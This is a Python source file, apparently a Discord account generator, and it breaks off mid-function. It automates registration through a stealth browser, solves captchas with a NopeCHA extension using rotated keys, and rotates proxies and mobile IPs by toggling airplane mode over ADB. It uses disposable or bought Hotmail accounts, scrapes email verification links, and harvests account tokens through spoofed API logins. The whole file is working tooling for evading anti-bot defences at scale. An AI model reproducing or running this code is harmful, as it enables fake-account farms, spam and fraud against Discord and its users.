import asyncio
from datetime import datetime
import hashlib
import os
import shutil
from pathlib import Path
import platform
import re
import sys
import subprocess
import threading
import time
import json
import random
import string
import signal
import tempfile
from typing import Optional, Dict
import requests
import httpx
import tls_client
from colorama import Fore, Style, init
from rich.console import Console
import warnings
import nodriver as uc
from nodriver import cdp
import urllib3
import base64
import imaplib
import email
from email.message import Message
from bs4 import BeautifulSoup

# ============================================================================
# CDP KEY SENDER
# ============================================================================

async def _cdp_key(tab, key: str, code: str, keycode: int):
    try:
        await tab.send(
            cdp.input_.dispatch_key_event(
                type_="keyDown", key=key, code=code,
                windows_virtual_key_code=keycode,
                native_virtual_key_code=keycode,
            )
        )
        await asyncio.sleep(0.05)
        await tab.send(
            cdp.input_.dispatch_key_event(
                type_="keyUp", key=key, code=code,
                windows_virtual_key_code=keycode,
                native_virtual_key_code=keycode,
            )
        )
    except Exception:
        pass

# ============================================================================
# BRAVE BROWSER PATH
# ============================================================================

def get_brave_path() -> Optional[str]:
    paths = [
        r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
        r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\Application\brave.exe"),
        "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser",
        "/usr/bin/brave-browser",
        "/usr/bin/brave",
        "/snap/bin/brave",
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return None

BRAVE_PATH = get_brave_path()
if BRAVE_PATH:
    print(f"\033[92m[INFO]\033[0m Using Brave browser: {BRAVE_PATH}")
else:
    print("\033[93m[WARN]\033[0m Brave not found — falling back to default Chrome")

# ============================================================================
# ADB SUPPORT (full)
# ============================================================================

def get_adb_path() -> Optional[str]:
    script_dir = Path(__file__).parent
    local_paths = [
        script_dir / "platform-tools" / "adb.exe",
        script_dir / "adb" / "adb.exe",
    ]
    for path in local_paths:
        if path.exists():
            return str(path)
    try:
        result = subprocess.run(["where", "adb"], capture_output=True, text=True, timeout=5)
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip().split('\n')[0]
    except Exception:
        pass
    return None

def adb_run(args: list, timeout: int = 20) -> tuple[bool, str]:
    adb_path = get_adb_path()
    if not adb_path:
        return False, "ADB not found."
    try:
        cmd = [adb_path] + args
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        output = result.stdout + result.stderr
        if "unauthorized" in output.lower():
            return False, "Phone not authorized."
        if "no devices found" in output.lower() or "error: no devices" in output.lower():
            return False, "No ADB device found."
        if "offline" in output.lower():
            return False, "Device offline."
        return result.returncode == 0, output.strip()
    except subprocess.TimeoutExpired:
        return False, f"ADB command timeout after {timeout} seconds"
    except Exception as e:
        return False, f"ADB error: {str(e)}"

def check_adb_device() -> bool:
    success, output = adb_run(["devices"])
    if not success:
        print(f"\033[91m[ERROR]\033[0m {output}")
        return False
    lines = output.split('\n')
    for line in lines:
        if line.strip() and "device" in line and not "devices" in line:
            if "unauthorized" in line:
                print(f"\033[91m[ERROR]\033[0m Phone not authorized.")
                return False
            if "offline" in line:
                print(f"\033[91m[ERROR]\033[0m Device offline.")
                return False
            if "device" in line and "unauthorized" not in line and "offline" not in line:
                print(f"\033[92m[OK]\033[0m ADB device connected and authorized")
                return True
    print(f"\033[91m[ERROR]\033[0m No ADB device found.")
    return False

def adb_airplane_on() -> bool:
    print(f"\033[93m[ADB]\033[0m Enabling airplane mode...")
    success, output = adb_run(["shell", "cmd", "connectivity", "airplane-mode", "enable"])
    if success:
        print(f"\033[92m[OK]\033[0m Airplane mode enabled (method 1)")
        return True
    success, output = adb_run(["shell", "settings", "put", "global", "airplane_mode_on", "1"])
    if success:
        print(f"\033[92m[OK]\033[0m Airplane mode enabled (method 2)")
        adb_run(["shell", "am", "broadcast", "-a", "android.intent.action.AIRPLANE_MODE", "--ez", "state", "true"])
        return True
    print(f"\033[91m[ERROR]\033[0m Failed to enable airplane mode")
    return False

def adb_airplane_off() -> bool:
    print(f"\033[93m[ADB]\033[0m Disabling airplane mode...")
    success, output = adb_run(["shell", "cmd", "connectivity", "airplane-mode", "disable"])
    if success:
        print(f"\033[92m[OK]\033[0m Airplane mode disabled (method 1)")
        return True
    success, output = adb_run(["shell", "settings", "put", "global", "airplane_mode_on", "0"])
    if success:
        print(f"\033[92m[OK]\033[0m Airplane mode disabled (method 2)")
        adb_run(["shell", "am", "broadcast", "-a", "android.intent.action.AIRPLANE_MODE", "--ez", "state", "false"])
        return True
    print(f"\033[91m[ERROR]\033[0m Failed to disable airplane mode")
    return False

def adb_reset_mobile_network(wait_seconds: int = 7) -> bool:
    print(f"\033[94m[INFO]\033[0m Starting mobile network reset...")
    if not check_adb_device():
        return False
    if not adb_airplane_on():
        return False
    print(f"\033[93m[ADB]\033[0m Waiting {wait_seconds} seconds...")
    for i in range(wait_seconds):
        time.sleep(1)
        print(f"\033[93m[ADB]\033[0m {wait_seconds - i - 1} seconds remaining...", end='\r')
    print()
    if not adb_airplane_off():
        return False
    print(f"\033[92m[OK]\033[0m Mobile network reset complete!")
    return True

# ============================================================================
# NOPECHA AUTO-INSTALLER (full)
# ============================================================================

NOPECHA_PROFILE = Path(__file__).parent / "nopecha_profile"
NOPECHA_EXT_ID  = "dknlfmjaanfblgfdfebhijalfmhmjjjo"
NOPECHA_STORE   = f"https://chromewebstore.google.com/detail/nopecha-captcha-solver/{NOPECHA_EXT_ID}"
NOPECHA_EXT_DIR = Path(__file__).parent / "nopecha_ext"
NOPECHA_KEYS_FILE = Path(__file__).parent / "nopecha_keys.txt"

NOPECHA_BROWSER  = None
NOPECHA_KEY_INDEX = 0

def load_nopecha_keys() -> list:
    if not NOPECHA_KEYS_FILE.exists():
        NOPECHA_KEYS_FILE.write_text(
            "# Add your NopeCHA API keys here, one per line\n"
            "# Get keys from https://nopecha.com/setup\n"
            "# Each key gets 100 free solves\n"
        )
        return []
    keys = []
    for line in NOPECHA_KEYS_FILE.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            keys.append(line)
    return keys

def get_current_nopecha_key() -> Optional[str]:
    keys = load_nopecha_keys()
    if not keys:
        return None
    return keys[NOPECHA_KEY_INDEX % len(keys)]

def rotate_nopecha_key():
    global NOPECHA_KEY_INDEX
    keys = load_nopecha_keys()
    if keys:
        NOPECHA_KEY_INDEX = (NOPECHA_KEY_INDEX + 1) % len(keys)

def inject_nopecha_key(api_key: str):
    if not api_key or not NOPECHA_EXT_DIR.exists():
        return
    manifest_path = NOPECHA_EXT_DIR / "manifest.json"
    if not manifest_path.exists():
        return
    try:
        with open(manifest_path, 'r') as f:
            manifest = json.load(f)
        if 'nopecha' not in manifest:
            manifest['nopecha'] = {}
        manifest['nopecha']['key'] = api_key
        with open(manifest_path, 'w') as f:
            json.dump(manifest, f, indent=2)
        print(f"\033[92m[INFO]\033[0m NopeCHA key injected into manifest.json \u2713")
    except Exception as e:
        print(f"\033[93m[WARN]\033[0m manifest.json inject failed: {e}")

def download_nopecha_ext() -> Optional[Path]:
    if NOPECHA_EXT_DIR.exists() and (NOPECHA_EXT_DIR / "manifest.json").exists():
        return NOPECHA_EXT_DIR
    import zipfile, io
    log.info("Downloading NopeCHA automation extension...")
    zip_url = "https://github.com/NopeCHALLC/nopecha-extension/releases/latest/download/chromium_automation.zip"
    try:
        r = requests.get(zip_url, timeout=60, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        if r.status_code != 200:
            log.warning(f"NopeCHA download failed: HTTP {r.status_code}")
            return None
        NOPECHA_EXT_DIR.mkdir(exist_ok=True)
        with zipfile.ZipFile(io.BytesIO(r.content)) as z:
            z.extractall(NOPECHA_EXT_DIR)
        log.success("NopeCHA automation build downloaded!")
        return NOPECHA_EXT_DIR
    except Exception as e:
        log.warning(f"NopeCHA download error: {e}")
        return None

async def setup_nopecha(thread_idx: int = 0, proxy: str = None):
    profile_dir = Path(__file__).parent / f"nopecha_profile_{thread_idx}"
    profile_dir.mkdir(exist_ok=True)
    thread_ext_dir = Path(__file__).parent / f"nopecha_ext_{thread_idx}"
    if thread_ext_dir.exists():
        try: shutil.rmtree(thread_ext_dir)
        except: pass
    log.info(f"[Thread {thread_idx}] Connecting To Auto Captcha...")
    base_ext_path = download_nopecha_ext()
    if not base_ext_path:
        log.error("Base NopeCHA extension missing")
        return None
    shutil.copytree(base_ext_path, thread_ext_dir)
    current_key = get_current_nopecha_key()
    if current_key:
        manifest_path = thread_ext_dir / "manifest.json"
        try:
            with open(manifest_path, 'r') as f:
                manifest = json.load(f)
            if 'nopecha' not in manifest: manifest['nopecha'] = {}
            manifest['nopecha']['key'] = current_key
            if proxy and '@' in proxy:
                if 'webRequest' not in manifest['permissions']:
                    manifest['permissions'].append('webRequest')
                if 'webRequestAuthProvider' not in manifest['permissions']:
                    manifest['permissions'].append('webRequestAuthProvider')
            with open(manifest_path, 'w') as f:
                json.dump(manifest, f, indent=2)
        except Exception as e:
            log.warning(f"Thread manifest inject failed: {e}")
        keys = load_nopecha_keys()
        log.info(f"[Thread {thread_idx}] Using NopeCHA key #{NOPECHA_KEY_INDEX + 1}/{len(keys)}: {current_key[:8]}...")
    if proxy and '@' in proxy:
        try:
            auth_part, host_part = proxy.replace('http://', '').replace('https://', '').split('@')
            p_user, p_pass = auth_part.split(':')
            bg_path = thread_ext_dir / "background.js"
            auth_js = f"""
chrome.webRequest.onAuthRequired.addListener(
    function(details) {{
        return {{
            authCredentials: {{
                username: "{p_user}",
                password: "{p_pass}"
            }}
        }};
    }},
    {{urls: ["<all_urls>"]}},
    ["blocking"]
);
"""
            with open(bg_path, 'a') as f:
                f.write(auth_js)
            log.info(f"[Thread {thread_idx}] Proxy authentication injected")
        except Exception as e:
            log.warning(f"Proxy auth injection failed: {e}")
    browser_args = [
        f'--user-data-dir={profile_dir.absolute()}',
        '--no-first-run',
        '--disable-default-apps',
        '--disable-blink-features=AutomationControlled',
        '--disable-dev-shm-usage',
        '--no-sandbox',
        '--disable-web-security',
        '--disable-features=IsolateOrigins,site-per-process',
        '--window-size=1280,720',
        '--window-position={thread_idx*50},{thread_idx*50}',
        '--disable-setuid-sandbox',
        '--proxy-bypass-list=<-loopback>'
    ]
    clean_proxy = proxy
    if proxy and '@' in proxy:
        _, host_part = proxy.replace('http://', '').replace('https://', '').split('@')
        clean_proxy = f"http://{host_part}"
    if clean_proxy:
        browser_args.append(f'--proxy-server={clean_proxy}')
    browser_args.append(f'--load-extension={thread_ext_dir.absolute()}')
    browser_args.append(f'--disable-extensions-except={thread_ext_dir.absolute()}')
    browser = await uc.start(
        headless=False,
        browser_executable_path=BRAVE_PATH if BRAVE_PATH else None,
        browser_args=browser_args,
    )
    await asyncio.sleep(2)
    log.success(f"[Thread {thread_idx}] Connected To Auto Captcha")
    return browser

async def get_nopecha_page(browser):
    for attempt in range(5):
        try:
            page = await browser.get("https://discord.com/register")
            return page
        except StopIteration:
            await asyncio.sleep(2)
        except Exception as e:
            await asyncio.sleep(2)
    return None

# Groq (optional)
try:
    from groq import Groq
    GROQ_AVAILABLE = True
except ImportError:
    GROQ_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', category=ResourceWarning)
warnings.filterwarnings('ignore', message='.*connection.*refused.*')
warnings.filterwarnings('ignore', message='.*Task exception was never retrieved.*')

import logging
logging.getLogger('asyncio').setLevel(logging.CRITICAL)
logging.getLogger('websockets').setLevel(logging.CRITICAL)
logging.getLogger('nodriver').setLevel(logging.CRITICAL)

# ============================================================================
# DISCORD TOKEN FETCH (API fallback)
# ============================================================================

async def fetch_discord_token(email: str, password: str, proxy: str = None) -> str:
    url = "https://discord.com/api/v9/auth/login"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "x-discord-timezone": "Asia/Calcutta",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjM4NDg4NywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    }
    payload = {
        "gift_code_sku_id": None,
        "login": email,
        "login_source": None,
        "password": password,
        "undelete": False,
    }
    session = tls_client.Session(client_identifier="chrome_131", random_tls_extension_order=True)
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    try:
        response = session.post(url, headers=headers, json=payload)
        if response.status_code != 200:
            return ""
        data = response.json()
        return data.get("token", "")
    except:
        return ""

# ============================================================================
# JAVASCRIPT UTILITIES
# ============================================================================

JS_UTILS = '''
(() => {
    if (window.utils) return;
    function setInput(selector, value) {
        const el = document.querySelector(selector);
        if (el) { el.value = value; el.dispatchEvent(new Event('input', { bubbles: true })); el.dispatchEvent(new Event('change', { bubbles: true })); }
    }
    function clickAllCheckboxes() {
        const checkboxes = document.querySelectorAll('input[type="checkbox"]');
        let clicked = 0;
        checkboxes.forEach(cb => { if (!cb.checked) { cb.click(); cb.checked = true; cb.dispatchEvent(new Event('change', { bubbles: true })); clicked++; } });
        return { clicked: clicked, total: checkboxes.length };
    }
    function clickElement(selector) { const el = document.querySelector(selector); if (el) el.click(); }
    function setDropdown(label, value) {
        const dropdown = document.querySelector(`div[role="combobox"][aria-label="${label}"]`);
        if (!dropdown) return;
        dropdown.click();
        setTimeout(() => {
            const options = document.querySelectorAll('div[role="option"]');
            const match = Array.from(options).find(opt => opt.textContent.trim() === value);
            if (match) match.click();
        }, 100);
    }
    function waitForDiscordToken(timeout = 5000) {
        return new Promise((resolve) => {
            const start = Date.now();
            const check = () => {
                const token = localStorage.getItem('token');
                if (token) { resolve(token.replace(/^"|"$/g, '')); }
                else if (Date.now() - start < timeout) { setTimeout(check, 200); }
                else { resolve(null); }
            };
            check();
        });
    }
    window.utils = { setInput, clickAllCheckboxes, clickElement, setDropdown, waitForDiscordToken };
})();
'''

# ============================================================================
# CONFIGURATION & GLOBALS
# ============================================================================

console = Console()
LOCK = threading.Lock()
SCRIPT_DIR = Path(__file__).parent
MS_CLIENT_ID = "d8fbe69d-15be-43fa-b204-5c5bc5a73ad7"

SESSION_TARGET = 0
SESSION_CREATED = 0
SESSION_STOP = False
ADB_ENABLED = False
ADB_WAIT_TIME = 7

CONFIG_DIR = Path('input')
CONFIG_PATH = CONFIG_DIR / 'config.json'
OUTPUT_DIR = Path('output')
OUTPUT_DIR.mkdir(exist_ok=True)

def load_or_create_config():
    if not CONFIG_PATH.exists():
        CONFIG_DIR.mkdir(exist_ok=True)
        template_config = {
            "threads": 1,
            "email_provider": {
                "name": "",
                "api_key": "",
                "client_key": ""
            },
            "proxy": { "enabled": False, "file": "input/proxies.txt" },
            "adb": { "enabled": False, "network_reset_wait": 7 }
        }
        with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
            json.dump(template_config, f, indent=4)
        print(f"\n\033[93m[CONFIG]\033[0m Config file created at: {CONFIG_PATH}")
        print(f"\033[93m[CONFIG]\033[0m Please edit it with your settings and run again.\n")
        sys.exit(0)
    with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
        config = json.load(f)
    provider = config.get("email_provider", {}).get("name", "")
    if provider not in ["cybertemp", "hotmail007", "tempmail", "zeus", "afhamxmailz"]:
        print(f"\033[91m[ERROR]\033[0m Invalid email provider in config: {provider}")
        print(f"\033[93m[INFO]\033[0m Please set 'email_provider.name' to 'cybertemp', 'hotmail007', 'tempmail', 'zeus', or 'afhamxmailz'")
        sys.exit(1)
    return config

config = load_or_create_config()
THREAD_COUNT = config.get("threads", 1)

# ============================================================================
# LOGGER
# ============================================================================

if sys.platform == 'win32':
    import ctypes
    try:
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass

GRAY   = '\033[90m'
GREEN  = '\033[92m'
CYAN   = '\033[96m'
RED    = '\033[91m'
YELLOW = '\033[93m'
WHITE  = '\033[97m'
RESET  = '\033[0m'
BLUE   = '\033[94m'

class Logger:
    def __init__(self): pass
    @staticmethod
    def _print(tag: str, tag_color: str, message: str):
        ts = datetime.now().strftime('%H:%M:%S')
        line = f"{GRAY}[{ts}]{RESET} {tag_color}{tag}{RESET} {WHITE}{message}{RESET}\n"
        sys.stdout.write(line)
        sys.stdout.flush()
    def mask_email(self, email: str) -> str:
        if '@' not in email: return email
        username, domain = email.split('@', 1)
        masked = (username[:4] if len(username) > 4 else username[0]) + '****'
        return f"{masked}@{domain}"
    def mask_token(self, token: str) -> str:
        return token[:20] + '***' if len(token) > 20 else token
    def email_got(self, email: str):
        self._print('[+]', CYAN, f'Connecting To Auto Captcha')
        self._print('[+]', GREEN, f'Connected To Auto Captcha  |  Email: {self.mask_email(email)}')
    def register_page(self): self._print('[+]', GREEN, 'Loaded Register Page')
    def filled_info(self): self._print('[+]', GREEN, 'Filled Form')
    def solving_captcha(self):
        self._print('[+]', YELLOW, 'Auto Solving....')
        self._captcha_start = time.time()
    def captcha_solved(self, answer: str = ""):
        elapsed = round(time.time() - getattr(self, '_captcha_start', time.time()), 1)
        self._print('[+]', GREEN, f'Successfully Auto Solved In {elapsed}s!')
    def verified_mail(self): self._print('[+]', GREEN, 'Auto Verified Successfully')
    def token_got(self, token: str): self._print('[+]', GREEN, f'Token: {self.mask_token(token)}')
    def token_status(self, status: str):
        color = GREEN if status == 'VALID' else (YELLOW if status == 'LOCKED' else RED)
        self._print('[+]', color, f'Token Status: {status}')
    def info(self, message: str): self._print('[INFO]', CYAN, message)
    def success(self, message: str): self._print('[+]', GREEN, message)
    def warning(self, message: str): self._print('[WARN]', YELLOW, message)
    def error(self, message: str): self._print('[ERROR]', RED, message)
    def debug(self, message: str): self._print('[DEBUG]', BLUE, message)

log = Logger()

# ============================================================================
# EMAIL PROVIDER CLASSES & FUNCTIONS
# ============================================================================

# ---------- HOTMAIL007 ----------
class Hotmail007API:
    def __init__(self, client_key: str):
        self.session = requests.Session()
        self.session.verify = False
        self.client_key = client_key
        self.base_url = "https://api.hotmail007.com"
        self.mail_types = ["outlook", "hotmail"]
    def _fetch_email(self, mail_type: str) -> dict:
        url = f"{self.base_url}/api/mail/getMail"
        params = {"clientKey": self.client_key, "mailType": mail_type, "quantity": 1}
        try:
            resp = self.session.get(url, params=params, verify=False)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("success") and data.get("code") == 0 and "data" in data:
                    accounts = data["data"]
                    if accounts:
                        parts = accounts[0].split(":")
                        if len(parts) >= 4:
                            return {"success": True, "email": parts[0], "password": parts[1],
                                    "token": parts[2], "uuid": parts[3] if parts[3] else ""}
        except: pass
        return {"success": False}
    def buy_email(self) -> dict:
        if not self.client_key:
            return {"success": False}
        start = time.time()
        while (time.time() - start) < 20:
            for mail_type in self.mail_types:
                account = self._fetch_email(mail_type)
                if account.get("success"):
                    return account
            time.sleep(1)
        return {"success": False}

def get_hotmail007_email(config: dict) -> tuple:
    client_key = config.get("email_provider", {}).get("client_key", "").strip()
    if not client_key:
        return None, None, None, None
    api = Hotmail007API(client_key)
    result = api.buy_email()
    if result.get("success"):
        return result.get("email"), result.get("password"), result.get("token"), result.get("uuid")
    return None, None, None, None

# ---------- ZEUS-X ----------
class ZeusXAPI:
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.base_url = "https://api.zeus-x.ru"
        self.session = requests.Session()
        self.session.verify = False
    def purchase_account(self, account_code: str = "HOTMAIL_TRUSTED") -> dict:
        url = f"{self.base_url}/purchase"
        params = {"apikey": self.api_key, "accountcode": account_code, "quantity": 1}
        try:
            resp = self.session.get(url, params=params, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, list) and data:
                    acc = data[0]
                    if isinstance(acc, str):
                        parts = acc.split(':')
                        if len(parts) >= 2:
                            return {"success": True, "email": parts[0], "password": parts[1]}
                    elif isinstance(acc, dict):
                        return {"success": True, "email": acc.get("email") or acc.get("login"),
                                "password": acc.get("password") or acc.get("pass")}
                elif isinstance(data, dict) and (data.get("email") or data.get("login")):
                    return {"success": True, "email": data.get("email") or data.get("login"),
                            "password": data.get("password") or data.get("pass")}
        except: pass
        return {"success": False}

def get_zeus_x_email(config: dict) -> tuple:
    api_key = config.get("email_provider", {}).get("zeus_x", {}).get("api_key", "").strip()
    if not api_key:
        api_key = config.get("email_provider", {}).get("api_key", "").strip()
    if not api_key:
        return None, None, None, None
    api = ZeusXAPI(api_key)
    account_code = config.get("email_provider", {}).get("zeus_x", {}).get("account_code", "HOTMAIL_TRUSTED")
    result = api.purchase_account(account_code)
    if result.get("success"):
        return result.get("email"), result.get("password"), "", ""
    return None, None, None, None

# ---------- TEMPMAIL (FREE, NO API KEY) ----------
class TempMailService:
    def __init__(self):
        self.base_url = "https://api.tempmail.com"
        self.session = requests.Session()
        self.session.verify = False

    def create_mailbox(self) -> tuple:
        try:
            r = self.session.get(f"{self.base_url}/generate", timeout=10)
            if r.status_code == 200:
                data = r.json()
                email = data.get('email')
                token = data.get('token')
                if email:
                    return email, token
            raise Exception("No email")
        except Exception as e:
            raise Exception(f"TempMail creation failed: {e}")

    def fetch_emails(self, token: str) -> list:
        try:
            r = self.session.get(f"{self.base_url}/inbox/{token}", timeout=10)
            if r.status_code == 200:
                data = r.json()
                return data.get('messages', [])
            return []
        except:
            return []

    def fetch_email_body(self, token: str, email_id: str) -> Optional[dict]:
        try:
            r = self.session.get(f"{self.base_url}/message/{token}/{email_id}", timeout=10)
            if r.status_code == 200:
                return r.json()
            return None
        except:
            return None

def get_tempmail_email(config: dict) -> tuple:
    try:
        service = TempMailService()
        email, token = service.create_mailbox()
        password = generate_password(16)
        return email, password, token, ""
    except Exception as e:
        log.error(f"TempMail error: {e}")
        return None, None, None, None

def verify_email_tempmail(email: str, token: str, timeout: int = 120, interval: int = 3) -> Optional[str]:
    log.info(f"Polling TempMail inbox for verification email: {email}")
    service = TempMailService()
    start = time.time()
    seen_ids = set()
    while time.time() - start < timeout:
        try:
            msgs = service.fetch_emails(token)
            if not msgs:
                time.sleep(interval)
                continue
            for msg in msgs[:10]:
                msg_id = msg.get('id')
                if msg_id in seen_ids:
                    continue
                seen_ids.add(msg_id)
                full = service.fetch_email_body(token, msg_id)
                if not full:
                    continue
                subject = full.get('subject', '').lower()
                from_addr = full.get('from', '').lower()
                body = full.get('body', '')
                is_discord = "discord" in from_addr or "noreply@discord.com" in from_addr
                is_verify = any(k in subject for k in ("verify", "confirm", "email"))
                if not (is_discord and is_verify):
                    continue
                direct = re.search(r'https://discord\.com/verify\?token=[^"\'\>\s&]+', body)
                if direct:
                    log.success("Extracted direct verify link from TempMail!")
                    return direct.group(0)
                for pat in [r'https://click\.discord\.com/ls/click\?[^"\'\>\s]+', r'https://links\.discord\.com[^"\'\>\s]+']:
                    for m in re.finditer(pat, body):
                        url = m.group(0)
                        try:
                            r2 = requests.get(url, allow_redirects=True, verify=False)
                            if "discord.com/verify" in r2.url:
                                log.success("Extracted verify link via redirect from TempMail!")
                                return r2.url
                            found = re.search(r'https://discord\.com/verify\?token=[^"\'\>\s]+', r2.text)
                            if found:
                                log.success("Extracted verify link from redirect body from TempMail!")
                                return found.group(0)
                        except: pass
        except Exception as e:
            log.debug(f"TempMail poll error: {e}")
        time.sleep(interval)
    log.warning("TempMail: Verification email not found after timeout")
    return None

# ---------- CYBERTEMP ----------
class CybertempAPI:
    def __init__(self, api_key: str = None):
        self.api_key = api_key
        self.base_url = "https://api.cybertemp.xyz"
        self.session = requests.Session()
        self.session.verify = False
        if api_key:
            self.session.headers.update({"X-API-KEY": api_key})
    def get_discord_domains(self) -> list:
        try:
            resp = self.session.get(f"{self.base_url}/getDomains", params={"type": "discord", "limit": 100}, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, list) and data:
                    return data
        except: pass
        return []
    def create_email(self) -> dict:
        domains = self.get_discord_domains()
        if not domains:
            return {"success": False}
        domain = random.choice(domains)
        local = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        email = f"{local}@{domain}"
        password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%", k=16))
        return {"success": True, "email": email, "password": password}

def get_cybertemp_email(config: dict) -> tuple:
    api_key = config.get("email_provider", {}).get("api_key", "").strip()
    api = CybertempAPI(api_key if api_key else None)
    result = api.create_email()
    if result.get("success"):
        return result.get("email"), result.get("password"), "", ""
    return None, None, None, None

# ---------- AFHAMXMAILZ ----------
class AfhamXMailzService:
    def __init__(self, config: dict):
        afham_config = config.get("email_provider", {}).get("afhamxmailz", {})
        self.api_url = afham_config.get("api_url", "https://afhamxmailz.com").rstrip('/')
        self.api_key = afham_config.get("api_key", "")
        self.domain = "afhamxmailz.com"
        self.session = requests.Session()
        self.session.verify = False
        if self.api_key:
            self.session.headers.update({"X-API-KEY": self.api_key})
    def get_domains(self) -> list:
        try:
            resp = self.session.get(f"{self.api_url}/getDomains", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, list) and data:
                    return data
        except: pass
        return [self.domain]
    def create_email(self) -> tuple:
        domains = self.get_domains()
        domain = random.choice(domains) if domains else self.domain
        local = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        email = f"{local}@{domain}"
        password = generate_password(16)
        return email, password
    def check_inbox(self, email: str) -> dict:
        try:
            resp = self.session.get(f"{self.api_url}/getMail", params={"email": email}, timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                messages = data if isinstance(data, list) else data.get("messages", [])
                return {"success": True, "messages": messages}
            else:
                return {"success": False, "error": f"HTTP {resp.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

def get_afhamxmailz_email(config: dict) -> tuple:
    try:
        service = AfhamXMailzService(config)
        email, password = service.create_email()
        return email, password, "", ""
    except Exception as e:
        log.error(f"AfhamXMailz error: {e}")
        return None, None, None, None

# ---------- PROVIDER DISPATCH ----------
def get_email_from_provider(config: dict) -> tuple:
    provider_name = config.get("email_provider", {}).get("name", "")
    if provider_name == "cybertemp":
        return get_cybertemp_email(config) + ("cybertemp",)
    elif provider_name == "hotmail007":
        return get_hotmail007_email(config) + ("hotmail007",)
    elif provider_name == "zeus":
        return get_zeus_x_email(config) + ("zeus",)
    elif provider_name == "tempmail":
        return get_tempmail_email(config) + ("tempmail",)
    elif provider_name == "afhamxmailz":
        return get_afhamxmailz_email(config) + ("afhamxmailz",)
    return None, None, None, None, None

# ============================================================================
# TOKEN CHECK & EMAIL VERIFICATION
# ============================================================================

def check_token(token: str) -> str:
    try:
        session = tls_client.Session(client_identifier="chrome_138", random_tls_extension_order=True)
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
        }
        response = session.get('https://discordapp.com/api/v9/users/@me/library', headers=headers)
        if response.status_code == 200:
            return 'VALID'
        elif response.status_code == 403:
            return 'LOCKED'
        elif response.status_code == 401:
            return 'INVALID'
        elif response.status_code == 429:
            return 'ERROR'
        else:
            return 'INVALID'
    except:
        return 'ERROR'

def check_email_verified_api(token: str):
    try:
        session = tls_client.Session(client_identifier="chrome_138", random_tls_extension_order=True)
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        response = session.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            data = response.json()
            verified = data.get('verified', False)
            email = data.get('email', 'N/A')
            return verified, email
        return None, None
    except:
        return None, None

def verify_email_imap(email_user, email_pass, imap_server,
                      subject_filter="Verify email address for Discord",
                      timeout=120, interval=3) -> Optional[str]:
    if '@' not in email_user:
        return None
    start = time.time()
    while time.time() - start < timeout:
        try:
            mail = imaplib.IMAP4_SSL(imap_server)
            mail.login(email_user, email_pass)
            mail.select("inbox")
            _, data = mail.search(None, "ALL")
            mail_ids = data[0].split()
            if not mail_ids:
                mail.logout()
                time.sleep(interval)
                continue
            for i in reversed(mail_ids[-10:]):
                _, msg_data = mail.fetch(i, '(RFC822)')
